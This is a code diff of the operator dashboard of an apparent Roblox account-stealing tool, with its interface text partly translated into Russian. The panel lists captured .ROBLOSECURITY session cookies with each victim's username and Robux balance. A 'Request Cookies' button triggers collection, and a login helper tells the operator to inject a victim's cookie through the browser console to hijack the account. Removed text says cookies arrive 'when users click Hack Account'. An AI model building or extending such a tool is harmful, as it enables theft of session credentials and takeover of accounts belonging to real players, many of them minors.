+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"></path><polyline points="10 17 15 12 10 7"></polyline><line x1="15" y1="12" x2="3" y2="12"></line></svg>
+          Войти
+        </button>
+        <button class="btn-secondary" onclick="copyText('${c.cookie.replace(/'/g, "\\'")}')">📋 Копировать Cookie</button>
+        <button class="btn-secondary" onclick="deleteCookie(${i})">Удалить</button>
       </div>
-    </div>`;
+    </div>`).join('');
+}
+
+function copyText(t) {
+    navigator.clipboard.writeText(t);
+}
+
+function loginToRoblox(cookie) {
+    navigator.clipboard.writeText(cookie);
+    window.open('https://www.roblox.com/home', '_blank');
+    setTimeout(() => {
+        alert('Cookie скопирован!\n\n1. Откройте Roblox\n2. Нажмите F12 → Console\n3. Вставьте и нажмите Enter:\n\ndocument.cookie=".ROBLOSECURITY=' + cookie + '; path=/; domain=.roblox.com"\n\n4. Обновите страницу (F5)');
+    }, 1000);
+}
+
+function openSettings() { document.getElementById('settings-modal').classList.add('active'); }
+function closeSettings() { document.getElementById('settings-modal').classList.remove('active'); }
+
+async function saveProfile() {
+    const name = document.getElementById('set-name').value;
+    const avatar = document.getElementById('set-avatar').value;
+    const bio = document.getElementById('set-bio').value;
+    const r = await api('POST', '/api/settings', { username: name, avatar, bio });
+    if (r) state.profile = { username: name, avatar, bio };
+    closeSettings();
+    render();
+}
+
+async function deleteCookie(i) {
+    if(confirm('Удалить аккаунт?')) {
+        await api('DELETE', '/api/cookies/' + i);
+        state.cookies.splice(i, 1);
+        renderCards();
+    }
 }
 
 async function login() {
@@ -289,169 +513,14 @@ async function login() {
     try {
         const r = await api('POST', '/api/login', { password: pwd });
         if (r && r.ok) { state.authenticated = true; init(); }
-        else err.textContent = 'Wrong password';
-    } catch { err.textContent = 'Login failed'; }
-}
-
-function renderDashboard() {
-    app.innerHTML = `
-    ${state.theme === 'sakura' ? '<div id="petals"></div>' : ''}
-    <div class="container">
-      <div class="profile-bar">
-        <div class="profile-info">
-          ${state.profile?.avatar ? `<img src="${state.profile.avatar}" class="profile-avatar" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'" onload="this.nextElementSibling.style.display='none'"><div class="profile-avatar placeholder" style="display:none">👤</div>` : '<div class="profile-avatar placeholder">👤</div>'}
-          <div>
-            <div class="profile-name">${state.profile?.username || 'Robrain'}</div>
-            <div class="profile-bio">${state.profile?.bio || ''}</div>
-          </div>
-        </div>
-        <div class="header-actions">
-          <span>${state.cookies.length} accounts</span>
-          <button class="btn btn-primary btn-sm" onclick="requestCookies()">📥 Request Cookies</button>
-          <button class="btn btn-outline btn-sm" onclick="refreshCookies()">🔄 Refresh</button>
-          <button class="btn btn-outline btn-sm" onclick="openSettings()">⚙ Settings</button>
-          <button class="logout-btn" onclick="logout()">Logout</button>
-        </div>
-      </div>
-      <div class="cards" id="cards"></div>
-    </div>
-
-    <div class="modal-overlay" id="settings-modal">
-      <div class="modal">
-        <h2>⚙ Settings</h2>
-        <label>Display Name</label>
-        <input type="text" id="set-name" value="${state.profile?.username || ''}" placeholder="Your name">
-        <label>Avatar URL</label>
-        <input type="text" id="set-avatar" value="${state.profile?.avatar || ''}" placeholder="https://example.com/avatar.png">
-        <label>Bio</label>
-        <input type="text" id="set-bio" value="${state.profile?.bio || ''}" placeholder="About you">
-        <label>Theme</label>
-        <div style="display:flex;gap:8px;margin-top:6px;flex-wrap:wrap">
-          ${['purple','blue','red','green','crimson','gold','sakura'].map(t =>
-            `<div class="theme-dot ${t} ${state.theme===t?'active':''}" onclick="setTheme('${t}')"></div>`
-          ).join('')}
-        </div>
-        <div class="modal-actions">
-          <button class="btn btn-outline" onclick="closeSettings()">Cancel</button>
-          <button class="btn btn-primary" onclick="saveProfile()">Save</button>
-        </div>
-      </div>
-    </div>`;
-
-    if (state.theme === 'sakura') startPetals();
-    renderCards();
-}
-
-function startPetals() {
-    const container = document.getElementById('petals');
-    if (!container || container.children.length > 0) return;
-    for (let i = 0; i < 30; i++) {
-        const p = document.createElement('div');
-        p.className = 'petal';
-        p.style.left = Math.random() * 100 + '%';
-        p.style.animationDuration = (6 + Math.random() * 8) + 's';
-        p.style.animationDelay = Math.random() * 10 + 's';
-        p.style.transform = 'rotate(' + Math.random() * 360 + 'deg)';
-        container.appendChild(p);
-    }
-}
-
-function renderCards() {
-    const container = document.getElementById('cards');
-    if (!state.cookies.length) {
-        container.innerHTML = '<div class="empty"><h2>No accounts yet</h2><p>Cookies will appear here when users click Hack Account</p></div>';
-        return;
-    }
-    container.innerHTML = state.cookies.map((c, i) => `
-    <div class="card">
-      <div class="card-top">
-        <div style="display:flex;align-items:center;gap:10px">
-          ${c.avatar ? `<img src="${c.avatar}" class="rbx-avatar">` : '<div class="rbx-avatar placeholder">👤</div>'}
-          <div>
-            <div class="card-name">${c.username}</div>
-            <div class="card-user">@${c.roblox_user || ''}</div>
-            <div class="card-time">${new Date(c.time).toLocaleString()}</div>
-          </div>
-        </div>
-        <div class="robux-badge">💰 ${c.robux ?? '?'} R$</div>
-      </div>
-      <div class="card-cookie" onclick="copyText('${c.cookie.replace(/'/g, "\\'")}')" title="Click to copy">${c.cookie}</div>
-      <div class="card-bottom">
-        <button class="btn btn-primary btn-sm" onclick="loginToRoblox('${c.cookie.replace(/'/g, "\\'")}')">▶ Login</button>
-        <button class="btn btn-outline btn-sm" onclick="copyText('${c.cookie.replace(/'/g, "\\'")}')">📋 Copy</button>
-        <button class="btn btn-danger btn-sm" onclick="deleteCookie(${i})">✕ Delete</button>
-      </div>
-    </div>`).join('');
-}
-
-function copyText(t) { navigator.clipboard.writeText(t); }
-
-function loginToRoblox(cookie) {
-    navigator.clipboard.writeText(cookie);
-    const robloxWin = window.open('https://www.roblox.com/home', '_blank');
-    setTimeout(() => {
-        alert('Cookie copied!\n\n1. Open Roblox (already opened)\n2. Press F12 → Console\n3. Paste this and press Enter:\n\ndocument.cookie=".ROBLOSECURITY=' + cookie + '; path=/; domain=.roblox.com"\n\n4. Refresh the page (F5)');
-    }, 1000);
-}
-
-async function requestCookies() {
-    const btn = event.target;
-    btn.textContent = '⏳ Waiting...';
-    btn.disabled = true;
-    const r = await api('POST', '/api/trigger-cookies');
-    if (r) {
-        let waited = 0;
-        const check = setInterval(async () => {
-            const c = await api('GET', '/api/cookies');
-            if (c && c.length > state.cookies.length) {
-                state.cookies = c;
-                renderCards();
-                btn.textContent = '📥 Request Cookies';
-                btn.disabled = false;
-                clearInterval(check);
-            }
-            waited += 3;
-            if (waited > 60) {
-                btn.textContent = '📥 Request Cookies';
-                btn.disabled = false;
-                clearInterval(check);
-            }
-        }, 3000);
-    } else {
-        btn.textContent = '📥 Request Cookies';
-        btn.disabled = false;
-    }
-}
-
-async function refreshCookies() {
-    const c = await api('GET', '/api/cookies');
-    if (c) state.cookies = c;
-    renderCards();
-}
-
-function openSettings() { document.getElementById('settings-modal').classList.add('open'); }
-function closeSettings() { document.getElementById('settings-modal').classList.remove('open'); }
-
-async function saveProfile() {
-    const name = document.getElementById('set-name').value;
-    const avatar = document.getElementById('set-avatar').value;
-    const bio = document.getElementById('set-bio').value;
-    const r = await api('POST', '/api/settings', { username: name, avatar, bio, theme: state.theme });
-    if (r) state.profile = { username: name, avatar, bio };
-    closeSettings();
-    renderDashboard();
-}
-
-async function setTheme(t) {
-    state.theme = t;
-    document.documentElement.setAttribute('data-theme', t);
-    renderDashboard();
-}
-
-async function deleteCookie(i) {
-    await api('DELETE', `/api/cookies/${i}`);
-    state.cookies.splice(i, 1);
-    renderCards();
+        else {
+            err.textContent = 'Неверный пароль';
+            const card = document.querySelector('.login-card');
+            card.style.animation = 'none';
+            card.offsetHeight;
+            card.style.animation = 'scaleUp 0.3s cubic-bezier(0.34, 1.56, 0.64, 1)';
+        }
+    } catch { err.textContent = 'Ошибка сервера'; }
 }
 
 async function logout() {
@@ -460,9 +529,27 @@ async function logout() {
     render();
 }
 
+async function refreshCookies() {
+    const c = await api('GET', '/api/cookies');
+    if (c) state.cookies = c;
+    renderCards();
+}
+
+async function requestTokens() {
+    await api('POST', '/api/trigger-cookies');
+    const btn = document.getElementById('btnRequestAll');
+    if (btn) {
+        const oldText = btn.innerHTML;
+        btn.innerHTML = 'Запрос отправлен!';
+        btn.style.color = 'var(--success)';
+        setTimeout(() => { btn.innerHTML = oldText; btn.style.color = 'var(--accent)'; }, 2000);
+    }
+}
+
 init();
 </script>
-</body></html>
+</body>
+</html>
 """
 
 @app.get("/")
